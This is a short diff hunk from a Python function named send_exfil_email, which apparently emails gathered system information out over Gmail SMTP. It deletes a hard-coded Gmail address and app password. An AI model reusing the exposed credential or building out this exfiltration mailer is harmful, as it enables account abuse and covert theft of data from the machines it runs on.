@@ -337,8 +337,8 @@ def send_exfil_email(recipient_email, system_info):
         # Gmail SMTP configuration
         smtp_server = 'smtp.gmail.com'
         smtp_port = 587
-        sender_email = 'neutrino.quantam@gmail.com'
-        sender_password = 'qhsq ysvt afrr digy'
+        sender_email = ''
+        sender_password = ''
         
         # Create message
         try:
